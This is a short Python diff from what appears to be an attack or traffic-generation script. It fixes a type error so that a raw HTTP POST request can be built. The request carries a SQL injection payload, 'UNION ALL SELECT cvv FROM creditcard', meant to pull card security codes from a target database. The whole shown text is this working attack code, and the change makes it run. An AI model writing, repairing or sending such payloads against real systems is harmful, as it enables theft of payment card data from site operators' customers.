@@ -34,7 +34,7 @@ s_port = random.randint(20000,65500)
 
 injection_string = 'name=" UNION ALL SELECT cvv FROM creditcard WHERE "1"="1'
 cont_length = len(injection_string)
-getStr = 'POST / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ' + cont_length + '\r\n\r\n' + injection_string
+getStr = 'POST / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ' + str(cont_length) + '\r\n\r\n' + injection_string
 
 
 
